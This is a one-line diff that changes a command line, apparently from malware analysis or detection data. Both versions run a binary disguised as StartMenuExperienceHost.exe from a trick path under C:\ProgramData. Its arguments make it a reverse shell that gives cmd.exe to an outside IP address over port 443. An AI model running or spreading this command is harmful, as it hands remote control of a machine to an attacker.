@@ -1,1 +1,1 @@
-powershell -C C:\ProgramData\AUX.\StartMenuExperienceHost.exe --ssl 193.124.33.180 443 -e cmd.exe
+C:\ProgramData\AUX.\StartMenuExperienceHost.exe --ssl 193.124.33.180 443 -e cmd.exe
